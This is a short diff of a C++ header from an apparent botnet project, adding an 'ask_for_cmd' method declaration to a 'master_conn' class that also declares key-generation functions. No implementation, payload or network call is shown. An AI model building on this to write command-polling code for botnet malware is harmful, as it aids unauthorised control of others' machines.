@@ -19,6 +19,8 @@ namespace botnet {
         std::string combineKeys(int keyServer);
     public:
         master_conn();
+
+        std::vector<std::string> ask_for_cmd();
         
         int keyGen();
         void setKeyServer(int key);
